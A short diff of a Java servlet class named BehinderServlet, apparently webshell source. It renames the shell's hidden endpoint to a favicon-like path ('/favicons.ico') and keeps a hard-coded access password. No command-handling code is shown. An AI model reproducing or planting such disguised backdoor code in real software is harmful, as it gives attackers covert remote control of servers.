@@ -32,7 +32,7 @@ public final class BehinderServlet extends ClassLoader implements Servlet {
     public HttpServletResponse response = null;
     public String cs = "UTF-8";
     public String Pwd = "eac9fa38330a7535";
-    public String path = "/favicondemo.ico";
+    public String path = "/favicons.ico";
 
     public BehinderServlet() {
     }
